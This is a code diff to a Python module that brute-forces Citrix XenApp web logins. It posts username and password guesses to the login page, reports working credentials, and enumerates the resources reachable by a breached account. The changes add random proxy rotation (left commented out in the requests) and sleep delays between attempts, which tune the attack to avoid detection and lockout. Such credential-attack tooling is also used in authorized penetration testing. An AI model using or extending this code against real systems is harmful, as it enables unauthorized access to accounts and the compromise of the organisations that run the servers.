@@ -6,6 +6,8 @@ from requests import session
 import requests
 import re
 from argparse import ArgumentParser
+import random
+
 
 class citrixBrute2010(webModule):
     def __init__(self, config, display, lock):
@@ -13,8 +15,8 @@ class citrixBrute2010(webModule):
         self.fingerprint="20[1,0][4,8,0,9] Citrix"
         self.response="Success"
     ignore = ['Settings','Log Off', 'Messages']
-    def somethingCool(self, config, c, cookies2, cpost):
-       resp3 = c.get(config["HOST"] + '/Citrix/XenApp/site/default.aspx?CTX_MessageType=INFORMATION&CTX_MessageKey=WorkspaceControlReconnectPartialTemp', cookies=cookies2, allow_redirects=False, verify=False)
+    def somethingCool(self, config, c, cookies2, cpost, proxy):
+       resp3 = c.get(config["HOST"] + '/Citrix/XenApp/site/default.aspx?CTX_MessageType=INFORMATION&CTX_MessageKey=WorkspaceControlReconnectPartialTemp', cookies=cookies2, allow_redirects=False, verify=False)#, proxies=proxy)
        m = re.search('There are no resources currently available for this user.', resp3.text)
        if m:
            print("[-]      No resources available for user.")
@@ -26,15 +28,16 @@ class citrixBrute2010(webModule):
                    print('[+]                 ' + n)
     def connectTest(self, config, payload, cookies2):
         with session() as c:
+            proxy = random.choice(config["proxies"])
             requests.packages.urllib3.disable_warnings()
-            cpost = c.post(config["HOST"] + '/Citrix/XenApp/auth/login.aspx', cookies=cookies2, data=payload, allow_redirects=False, verify=False)
+            cpost = c.post(config["HOST"] + '/Citrix/XenApp/auth/login.aspx', cookies=cookies2, data=payload, allow_redirects=False, verify=False)#, proxies=proxy)
             #print cpost.text
             m = re.search('default.aspx', cpost.text)
             if m:
                 print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                 if not config["dry_run"]:
                     print("[!] Time to do something cool!")
-                    self.somethingCool(config, c, cookies2, cpost)
+                    self.somethingCool(config, c, cookies2, cpost, proxy)
             else:
                 print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
     def payload(self, config):
@@ -63,6 +66,7 @@ class citrixBrute2010(webModule):
                                 'password': config["PASSWORD"]
                                 }
                             self.connectTest(config, payload, cookies2)
+                            time.sleep(config["timeout"])
                     else:
                         config["PASSWORD"] = pass_line.strip('\n')
                         payload = {
@@ -71,6 +75,7 @@ class citrixBrute2010(webModule):
                             'password': config["PASSWORD"]
                             }
                         self.connectTest(config, payload, cookies2)
+                        time.sleep(config["timeout"])
             elif config["UserFile"]:
                 lines = [line.rstrip('\n') for line in open(config["UserFile"])]
                 for line in lines:
